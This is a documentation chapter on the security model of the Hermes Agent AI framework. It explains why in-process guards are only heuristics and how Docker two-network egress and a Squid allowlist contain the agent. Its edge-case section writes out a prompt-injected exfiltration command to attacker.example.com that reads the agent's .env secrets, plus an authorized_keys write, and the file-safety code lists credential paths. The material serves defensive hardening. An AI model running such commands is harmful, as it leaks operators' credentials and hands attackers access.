---
title: "Security — The OS Boundary, Heuristics, and Isolation Postures"
description: "What actually contains Hermes Agent: the OS boundary is the only real security boundary; every in-process tool is a heuristic, not a wall."
category: security
type: explanation
tags:
  - security
  - OS boundary
  - only real security boundary
  - SECURITY.md
  - approval gate heuristic
  - guardrail controller heuristic
  - file-write denied paths
  - build_write_denied_paths
  - credential scrubbing
  - Skills Guard
  - injection pattern detection
  - terminal backend isolation
  - Docker two-network
  - Squid Envoy egress
  - gateway authorization
  - shell hooks allowlist
  - whole-process wrapping
  - NVIDIA OpenShell
  - isolation posture
  - trust model
  - adversarial LLM
  - prompt injection
  - egress proxy
  - credential_persistence
  - sanitize_borrowed_credential_payload
keywords:
  - containment
  - sandbox
  - network isolation
  - egress allowlist
  - docker compose security
  - hermes trust model
  - in-process heuristic
  - output redaction
  - denylist
  - shell Turing-complete
  - loopback bind
  - API server off by default
sources: [S3, S56, S57, S74, S75]
---

**TL;DR** — Hermes Agent's own security policy states that the only real containment against an adversarial LLM is the operating system. Every in-process mechanism — the approval gate, file-write denylist, credential scrubbing, guardrail controller, and Skills Guard — is a **heuristic** that reduces accidents and aids review, but is not a wall. This chapter unpacks what that distinction means, catalogs each heuristic honestly, and walks through the two OS-level postures (terminal-backend isolation and whole-process wrapping with Docker two-network egress) that actually contain the agent.

# Security — The OS Boundary, Heuristics, and Isolation Postures

## Why the honest framing matters

Here is the problem we need to solve before we look at any mechanism: if you run Hermes Agent against content you do not control — inbound email, web-fetched pages, a multi-user Telegram channel — you need to know **what actually stops the LLM from doing things it should not do**. If you believe a pattern-matching approval gate is a wall, you will under-invest in real isolation. If you believe it is a heuristic, you will pair it with something that genuinely contains the agent process.

Hermes Agent's own `SECURITY.md` opens its trust model with this statement:

> **The only security boundary against an adversarial LLM is the operating system.** Nothing inside the agent process constitutes containment — not the approval gate, not output redaction, not any pattern scanner, not any tool allowlist. Any in-process component that screens LLM output is a heuristic operating on an attacker-influenced string, and this policy treats it as such.

We will use this framing throughout the chapter. Everything in **Part A** is a heuristic — genuinely useful, worth keeping, but not containment. Everything in **Part B** is an OS-level mechanism that, when chosen deliberately, actually confines what the agent can reach.

---

## Part A — In-process tools are heuristics, not security boundaries

The components below screen or warn about LLM behavior. They differ in what they catch and how they work, but they share one property: they all operate on strings or data produced by or passed through the agent process, and a determined LLM output can defeat any of them. The table names each tool, says what it does, and explains why it is not a security boundary.

| Tool | What it does | Why it is NOT a boundary |
|---|---|---|
| **Approval gate** | Detects common destructive shell patterns; prompts the operator before execution. | Shell is Turing-complete. A denylist over shell strings is structurally incomplete — there is always a way to phrase a destructive command that no regex anticipated. The gate catches cooperative-mode mistakes, not adversarial output. |
| **File-write denylist** (`build_write_denied_paths`) | Blocks writes to a hardcoded set of sensitive exact paths and directory prefixes. | The terminal tool runs as the same OS user. The agent can still reach any of these paths via the shell. The denylist is defense-in-depth that returns a clear error to models that respect tool denials — it does not stop a model that reaches for `terminal()`. |
| **Credential scrubbing** (`sanitize_borrowed_credential_payload`) | Strips raw secret values from credential-pool entries before subprocess environments are populated; borrowed/reference-only sources have secret fields removed. | Any component inside the agent process — skills, plugins, hook handlers — can read whatever the agent itself can read, including in-memory credentials. Scrubbing reduces *casual* exfiltration, not exfiltration by an in-process component. |
| **Guardrail controller** (`ToolCallGuardrailController`) | Monitors tool-call patterns in the conversation loop; can halt runaway behavior when thresholds are exceeded. | Operates inside the agent interpreter. A sufficiently crafted sequence of tool calls could, in principle, stay below any threshold while still causing harm. It is a loop-integrity guard, not a containment layer. |
| **Skills Guard** | Scans installable skill content for injection patterns (exfiltration, destructive commands, persistence, obfuscation) before installation. | Explicitly documented as a review aid, not a hard block. Community-sourced skills are blocked on any finding, but "dangerous" pattern matches depend on the regex set shipped at build time. The actual boundary for third-party skills is operator review of the Python code and scripts before install — not the scan alone. |

Let's look at each one in more detail so we understand exactly what it does and where it ends.

### The approval gate — catching cooperative-mode mistakes

The approval gate intercepts calls to the terminal tool and other potentially destructive operations. When a command matches a recognized dangerous pattern, it pauses and asks the operator: allow once, allow for this session, always allow, or deny.

The gate works well when the LLM is trying to be helpful and makes an overly broad choice — say, `rm -rf` in the wrong directory. It does not work when a crafted string deliberately avoids the denylist patterns. Because the shell can express any computation, any finite list of patterns has gaps. `SECURITY.md` states this directly: "Shell is Turing-complete; a denylist over shell strings is structurally incomplete." The gate catches mistakes, not attacks.

Approval gate behavior is introduced in detail in [Tools Registry and Approval Gate](../tools/tools-registry-and-approval-gate.md).

### The file-write denylist — exact paths and directory prefixes

`build_write_denied_paths()` in `agent/file_safety.py` returns a set of exact real paths that the file tools (`write_file`, `patch`) will refuse to touch:

```python
# agent/file_safety.py — simplified view of the denied path set
def build_write_denied_paths(home: str) -> set[str]:
    """Return exact sensitive paths that must never be written."""
    hermes_home = _hermes_home_path()
    hermes_root = _hermes_root_path()
    return {
        os.path.realpath(p)
        for p in [
            os.path.join(home, ".ssh", "authorized_keys"),
            os.path.join(home, ".ssh", "id_rsa"),
            os.path.join(home, ".ssh", "id_ed25519"),
            os.path.join(home, ".ssh", "config"),
            str(hermes_home / ".env"),
            str(hermes_root / ".env"),
            str(hermes_home / ".anthropic_oauth.json"),
            str(hermes_root / ".anthropic_oauth.json"),
            os.path.join(home, ".bashrc"),
            os.path.join(home, ".zshrc"),
            os.path.join(home, ".profile"),
            os.path.join(home, ".netrc"),
            os.path.join(home, ".pgpass"),
            os.path.join(home, ".npmrc"),
            os.path.join(home, ".pypirc"),
            os.path.join(home, ".git-credentials"),
            "/etc/sudoers",
            "/etc/passwd",
            "/etc/shadow",
        ]
    }
```

A companion function `build_write_denied_prefixes()` adds entire directory subtrees: `~/.ssh/`, `~/.aws/`, `~/.gnupg/`, `~/.kube/`, `/etc/sudoers.d/`, `/etc/systemd/`, `~/.docker/`, `~/.azure/`, `~/.config/gh/`, `~/.config/gcloud/`.

There is also `get_read_block_error()` for the `read_file` tool — it refuses to read Hermes internal cache and credential files, and common project-local `.env` files. Importantly, the source code's own docstring labels this explicitly: *"This is NOT a security boundary. The terminal tool runs as the same OS user with shell access; the agent can still `cat auth.json` or `cat ~/.hermes/.env` and exfiltrate the file."* The read-block returns a clear error that empirically prompts most models to stop — it also surfaces a visible audit trail in logs.

### Credential scrubbing — borrowed secrets stay out of subprocess environments

When Hermes Agent spawns subprocesses (shell commands, MCP subprocesses, the code-execution child), it does not blindly forward its own environment. The `credential_persistence.py` module defines `sanitize_borrowed_credential_payload()`, which strips raw secret values from any credential-pool entry whose source is not one Hermes owns directly:

```python
# agent/credential_persistence.py — simplified
_PERSISTABLE_PROVIDER_SOURCES = frozenset({
    ("anthropic", "hermes_pkce"),
    ("minimax-oauth", "oauth"),
    ("nous", "device_code"),
    ("openai-codex", "device_code"),
    ("xai-oauth", "loopback_pkce"),
})

def sanitize_borrowed_credential_payload(payload, provider_id=None):
    """Return a disk-safe credential-pool payload.

    Owned sources pass through unchanged. Borrowed/reference-only sources
    keep labels and status metadata but raw secret value fields are removed.
    """
    if not is_borrowed_credential_source(payload.get("source"), provider_id):
        return dict(payload)
    # strip fields like access_token, api_key, bearer_token, secret, token, …
    fingerprint = _credential_secret_fingerprint(result)
    sanitized = {k: v for k, v in result.items() if not _is_secret_payload_key(k)}
    if fingerprint:
        sanitized["secret_fingerprint"] = fingerprint
    return sanitized
```

What `_is_secret_payload_key()` considers a secret: keys matching names like `access_token`, `refresh_token`, `api_key`, `apikey`, `api_token`, `auth_token`, `bearer_token`, `client_secret`, `credential`, `id_token`, `oauth_token`, `private_key`, `secret_key`, `session_token`, `password`, `secret`, `token`, and any key ending in `_api_key`, `_access_token`, `_auth_token`, `_refresh_token`, `_bearer_token`, `_client_secret`, `_id_token`, `_oauth_token`, `_private_key`, `_session_token`, `_secret_key`, `_password`, `_secret`, `_token`, or `_key`.

`SECURITY.md` is explicit about the limit: *"This reduces casual exfiltration. It is not containment. Any component running inside the agent process (skills, plugins, hook handlers) can read whatever the agent itself can read, including in-memory credentials."*

The credential pool in full is covered in [Credential Pool and Failover](../providers/credential-pool-and-failover.md).

### Skills Guard — a regex review aid

Skills Guard in `tools/skills_guard.py` runs before installation of any externally-sourced skill. It applies a set of regex-based threat patterns across the skill's files, categorizing findings by severity (`critical`, `high`, `medium`, `low`) and category (`exfiltration`, `injection`, `destructive`, `persistence`, `network`, `obfiltration`). The install policy enforces:

| Trust level | Safe verdict | Caution verdict | Dangerous verdict |
|---|---|---|---|
| `builtin` | allow | allow | allow |
| `trusted` | allow | allow | block |
| `community` | allow | block | block |
| `agent-created` | allow | allow | ask |

The `SECURITY.md` policy says: *"Skills Guard scans installable skill content for injection patterns. It is a review aid; the boundary for third-party skills is operator review before install."* The reason: skills execute arbitrary Python at import time. A well-crafted piece of Python code can do anything the operator's user account can do, without triggering any of the threat patterns in the regex set. Reviewing a skill means reading its Python code and scripts, not only its `SKILL.md` description.

The audit log for install events is written to `skills/.hub/audit.log`.

---

## What all heuristics share

The diagram below shows the relationship clearly:

```mermaid
flowchart TD
    subgraph inside["Inside the agent process (heuristics — not containment)"]
        A[LLM output / tool call request]
        B[Approval gate\ndetects destructive shell patterns]
        C[File-write denylist\nbuild_write_denied_paths]
        D[Credential scrubbing\nsanitize_borrowed_credential_payload]
        E[Guardrail controller\nToolCallGuardrailController]
        F[Skills Guard\ninjection-pattern scan]
        A --> B
        A --> C
        A --> D
        A --> E
        A --> F
    end

    subgraph os["OS-level isolation (real containment)"]
        G[Terminal-backend isolation\nDocker / SSH / Modal / Daytona sandbox]
        H[Whole-process wrapping\nDocker Compose + two-network egress\nor NVIDIA OpenShell]
    end

    inside -->|"agent process reaches here\nheuristics cannot stop it"| os
```

An LLM can produce output that flows through the agent process and reaches the OS. The heuristics slow it down and make most accidental harm visible. The OS-level isolation is what actually decides what the LLM's output can reach.

---

## Part B — OS-level isolation: what actually contains the agent

There are two distinct postures. They address different threats. An operator should choose deliberately based on the content the agent will ingest.

### Posture 1 — Terminal-backend isolation

The `terminal()` tool in Hermes Agent is pluggable. The **default** backend runs shell commands directly on the host. The non-default backends — Docker, SSH, Singularity, Modal, Daytona — run LLM-emitted shell commands **inside a container, remote host, or cloud sandbox**. The file tools (`read_file`, `write_file`, `patch`) are also implemented on top of the shell contract, so they run through the same backend and cannot reach paths the backend does not expose.

What terminal-backend isolation confines: anything the agent does via shell or file tool operations.

What terminal-backend isolation does **not** confine: everything the agent does inside its own Python process. This includes the code-execution tool (spawned as a host subprocess), MCP subprocesses (spawned from the agent's environment), plugin loading, hook dispatch, and skill loading — all of which run in the agent interpreter on the host.

Terminal-backend isolation is the right posture when the concern is LLM-emitted destructive shell commands or unwanted file writes, and the operator is otherwise trusted. It is not the right posture when the content being ingested — web pages, email, MCP server responses — could contain adversarial instructions aimed at in-process code paths.

The terminal backends are covered in detail in [Terminal Backends and MoA](../interfaces/terminal-backends-and-moa.md).

### Posture 2 — Whole-process wrapping

Whole-process wrapping runs the **entire agent process tree** inside a sandbox. Every code path — shell, code-execution, MCP, file tools, plugins, hooks, skill loading — is subject to the same filesystem, network, process, and inference policy. This is the supported posture when:

- The agent ingests content from surfaces the operator does not control: the open web, inbound email, multi-user channels, untrusted MCP servers.
- The deployment is production or shared.

Hermes Agent supports whole-process wrapping in two ways:

1. **Docker image and Compose setup** — lighter-weight; the agent runs in a standard container with operator-configured mounts and network policy.
2. **NVIDIA OpenShell** — provides per-session sandboxes with declarative policy across filesystem, network (L7 egress), process/syscall, and inference-routing layers. Network and inference policies are hot-reloadable. Credentials are injected from a Provider store and never touch the sandbox filesystem.

Under whole-process wrapping, the in-process heuristics from Part A function as **accident prevention layered on top of a real boundary** — they catch cooperative-mode mistakes even within the sandbox.

`SECURITY.md` is clear: *"Operators running the default local backend with untrusted input surfaces, or running a terminal-backend sandbox and expecting it to contain code paths that don't go through the shell, are operating outside the supported security posture."*

### Docker network egress isolation — the two-network model

The default `docker-compose.yml` uses `network_mode: host`, giving the agent container unrestricted outbound network access. For production deployments, you replace this with a **two-network model**.

The idea: the agent container lives on an internal bridge network that has no default route to the internet. A separate egress network has internet access. Only services that genuinely need to reach external APIs are attached to the egress network. All outbound traffic from the agent flows through an explicit egress proxy with an allowlist.

```mermaid
flowchart LR
    subgraph internal["Docker network: internal\n(no default route, no internet)"]
        A[hermes-agent]
        B[hermes-dashboard]
        C[hermes-gtw / gateway]
    end

    subgraph egress["Docker network: egress\n(internet-capable)"]
        D["egress-proxy\n(squid / envoy)"]
    end

    A --> C
    B --> C
    C -->|"dual-homed"| D
    D -->|"allowlisted hosts only"| E[Internet\napi.anthropic.com\napi.openai.com\napi.telegram.org\n…]
    D -->|blocked| F[Non-allowlisted hosts]
```

The gateway service is **dual-homed** — it sits on both the internal and egress networks so it can receive inbound messages from Telegram, Slack, and other platforms and forward them to the agent on the internal network.

The `docker-compose.yml` baseline comments spell out the intent:

```yaml
# docker-compose.yml (default — network_mode: host)
services:
  gateway:
    network_mode: host   # unrestricted; override for production
  dashboard:
    network_mode: host
    command: ["dashboard", "--host", "127.0.0.1", "--no-open"]
    # ^-- dashboard binds to 127.0.0.1 by default; API server is off unless
    #     API_SERVER_HOST and API_SERVER_KEY are explicitly uncommented
```

Two things to note from the default compose:
- The **dashboard binds to `127.0.0.1` by default** — not `0.0.0.0`. The compose comment says: *"It stores API keys; exposing it on LAN without auth is unsafe. If you want remote access, use an SSH tunnel."*
- The **API server is off by default** — the `API_SERVER_HOST` and `API_SERVER_KEY` environment variables are commented out; enabling them on an internet-facing host requires reading `docs/user-guide/api-server.md` first.

To switch from `host` mode to the two-network model, create a `docker-compose.override.yml`:

```yaml
# docker-compose.override.yml — two-network egress isolation
networks:
  internal:
    driver: bridge
    internal: true      # no default route, no internet
  egress:
    driver: bridge

services:
  gateway:
    network_mode: ""    # clear the host-mode default
    networks:
      - internal
      - egress          # dual-homed: receives from platforms, reaches LLM APIs
    ports:
      - "127.0.0.1:9119:9119"   # dashboard proxy, localhost only

  dashboard:
    network_mode: ""
    networks:
      - internal        # internal only; no egress needed
```

### Adding a Squid egress proxy with an explicit allowlist

The two-network model already prevents arbitrary outbound connections from the agent. Adding a **Squid or Envoy proxy** on the egress network gives you a named allowlist: any host not in the list is blocked, even if the container can technically reach the egress network.

```yaml
# docker-compose.override.yml (with egress proxy)
services:
  gateway:
    network_mode: ""
    networks:
      - internal
      - egress
    environment:
      - HTTP_PROXY=http://egress-proxy:3128
      - HTTPS_PROXY=http://egress-proxy:3128
      - NO_PROXY=hermes,hermes-dashboard,localhost

  dashboard:
    network_mode: ""
    networks:
      - internal

  egress-proxy:
    image: ubuntu/squid:6.10-24.04_edge
    networks:
      - egress
    volumes:
      - ./config/squid-allowlist.conf:/etc/squid/conf.d/allowlist.conf:ro
    restart: unless-stopped
```

The allowlist file (`config/squid-allowlist.conf`) is plain Squid ACL syntax:

```
# Only allow HTTPS CONNECT to these hosts
acl allowed_hosts dstdomain api.openai.com
acl allowed_hosts dstdomain api.anthropic.com
acl allowed_hosts dstdomain openrouter.ai
acl allowed_hosts dstdomain generativelanguage.googleapis.com
acl allowed_hosts dstdomain api.telegram.org
acl allowed_hosts dstdomain api.github.com
acl allowed_hosts dstdomain discord.com

http_access allow CONNECT allowed_hosts
http_access deny all
```

Adjust the list to match your LLM provider and messaging platform. When you add a new gateway platform adapter, add its API endpoint here too.

After starting the stack, you can verify isolation:

```bash
# From the agent container: this should FAIL (no egress without proxy)
docker compose exec gateway \
  curl -sf --max-time 5 https://example.com \
  && echo "FAIL: egress not blocked" || echo "OK: egress blocked"

# From the agent container: this should SUCCEED (internal network)
docker compose exec gateway \
  curl -sf --max-time 5 http://hermes-dashboard:9119/health \
  && echo "OK: internal reachable" || echo "FAIL"

# If using egress proxy: this should SUCCEED (allowlisted)
docker compose exec gateway \
  curl -sf --max-time 5 --proxy http://egress-proxy:3128 \
  https://api.openai.com/v1/models \
  && echo "OK" || echo "FAIL"
```

### Gateway authorization and external surfaces

Every surface through which a caller can dispatch agent work or receive agent output is an external surface, and each one requires its own authorization model. `SECURITY.md` §2.6 states: *"Authorization is required at every surface that crosses a trust boundary."* For messaging and network HTTP surfaces the trust boundary is the network; authorization means an operator-configured caller allowlist. For editor and local-IPC surfaces (ACP adapter, TUI gateway) the boundary is the host's user account: authorization means OS-level access control and loopback-only binds.

The uniform rules from `SECURITY.md` that apply to every surface:

- An allowlist is required for every enabled network-exposed adapter. Adapters must refuse to dispatch agent work, resolve approvals, or relay output until an allowlist is set.
- Session identifiers are **routing handles, not authorization**. Knowing another session's ID does not grant access to its approvals or output.
- Within an authorized set, all callers are equally trusted. Per-caller capability separation requires separate agent instances with separate allowlists.
- Binding a local-only surface to a non-loopback interface is a break-glass decision — the dashboard and other plugin HTTP servers default to loopback.

The gateway authorization model (DM pairing, allowlists, slash-command gating) is covered in full in [Gateway Authorization, DM Pairing, Slash Commands, and Handoff State](../gateway/authorization-pairing-and-slash-commands.md).

### Shell-hook allowlist

Shell hooks let operators configure shell scripts that fire on agent events (defined in the `hooks:` block of `cli-config.yaml`). Because these scripts run as subprocesses with access to the hook payload, first-use consent is required. The agent prompts the operator on the first encounter of each `(event, command)` pair; the answer is persisted to `~/.hermes/shell-hooks-allowlist.json`. Non-TTY callers must pass `--accept-hooks` (or set `HERMES_ACCEPT_HOOKS=1`, or set `hooks_auto_accept: true` in config) for registration to succeed without a prompt.

---

## Worked example — deploying an untrusted workload with Docker + two-network egress

Let's walk through what we would do if we wanted Hermes to process inbound email (an untrusted input surface) on a VPS. The agent will read email, draft replies, and call an LLM API — but we do not want it to reach arbitrary internet endpoints from within the container.

**1. Choose the posture.** Because email content is untrusted (we do not control what senders write), terminal-backend isolation alone is not enough — a crafted email could contain an adversarial instruction aimed at in-process code. We need whole-process wrapping with network egress isolation.

**2. Create the override.** We copy the two-network compose snippet from above into `docker-compose.override.yml` on the VPS. We pick the providers we actually use — say, Anthropic and the Telegram gateway — and write a minimal `config/squid-allowlist.conf`:

```
acl allowed_hosts dstdomain api.anthropic.com
acl allowed_hosts dstdomain api.telegram.org

http_access allow CONNECT allowed_hosts
http_access deny all
```

**3. Bring up the stack.** We run `HERMES_UID=$(id -u) HERMES_GID=$(id -g) docker compose up -d`. The gateway container is now on both `internal` (for communicating with the dashboard) and `egress` (for reaching Anthropic and Telegram through the proxy). The agent container is on `internal` only.

**4. Confirm.** We run the curl tests above. An attempt from the agent container to reach `https://example.com` directly should fail. An attempt via the proxy to `https://api.anthropic.com` should succeed.

**5. Check the caller allowlist.** We verify that the Telegram gateway adapter has a caller allowlist configured (the `TELEGRAM_ALLOWED_USERS` environment variable or its `config.yaml` equivalent). Without an allowlist, the gateway adapter will refuse to dispatch agent work — this is by design, as `SECURITY.md` §2.6 requires it.

Now in-process heuristics (the approval gate, file-write denylist, credential scrubbing) are functioning as the documentation says they should: **accident prevention layered on top of a real boundary**, not the boundary itself.

---

## Edge cases

### An LLM crafts a shell command that bypasses the denylist

Suppose a prompt-injected instruction tells the LLM to write to `~/.ssh/authorized_keys` using a roundabout path like `tee ~/.ssh/authorized_keys <<< "..."` rather than the file tool directly. The file-write denylist checks `write_file` and `patch` calls — it does not intercept arbitrary shell commands issued through the `terminal()` tool.

**What happens under terminal-backend isolation:** if the terminal backend is Docker or SSH, the command runs inside the sandbox. The sandbox's `~/.ssh/authorized_keys` is not the operator's host `~/.ssh/authorized_keys`. The heuristic fails; the OS boundary holds.

**What happens under the default local backend:** the command runs on the host with the operator's user account permissions. The heuristic was the only layer — it failed. This is why `SECURITY.md` says: *"Operators running the default local backend with untrusted input surfaces… are operating outside the supported security posture."*

### An egress attempt to a non-allowlisted host

Suppose a prompt-injected instruction tells the agent to `curl https://attacker.example.com/exfil?data=$(cat ~/.hermes/.env)`. Under the two-network egress model with a Squid proxy:

1. The `read_file` tool returns an error for `.env` (the read-deny heuristic). A model that respects tool denials stops here.
2. If the model reaches for `terminal()` to `cat ~/.hermes/.env` instead, the file-safety module's shell-command warning may surface, but it does not block the shell.
3. If the shell command runs and the `curl` attempt fires, the Squid proxy checks `attacker.example.com` against the allowlist. It is not there. The proxy returns an HTTP 403; the `curl` fails.

The OS boundary — the network policy enforced by the proxy — stopped the exfiltration even after every in-process heuristic was bypassed.

### DNS note

The `internal` network can still resolve external DNS names unless you also run a local DNS resolver that blocks external queries. For most threat models this is acceptable — DNS resolution alone does not exfiltrate meaningful data — but it is worth noting for deployments with stricter requirements.

---

## Summary — the two questions to ask before deploying

Before running Hermes in any environment, ask two questions:

1. **What input surfaces will the agent ingest?** If any are untrusted (open web, inbound email, multi-user channels, untrusted MCP servers), whole-process wrapping is required. Terminal-backend isolation alone is insufficient because it does not confine in-process code paths.

2. **What network access should the agent container have?** If unrestricted outbound access is not acceptable, add the two-network model with an egress proxy and allowlist. The default `network_mode: host` is convenient for development; it is not appropriate for production or shared deployments.

The in-process heuristics are worth keeping and improving — they catch real accidents and aid review. They are not the answer to either question.

---

← Previous: [Gateway Authorization, DM Pairing, Slash Commands, and Handoff State](../gateway/authorization-pairing-and-slash-commands.md) · Next: [The Plugin System and Observer Hooks (hermes.observer.v1)](../extensions/plugin-system-and-observer-hooks.md) →
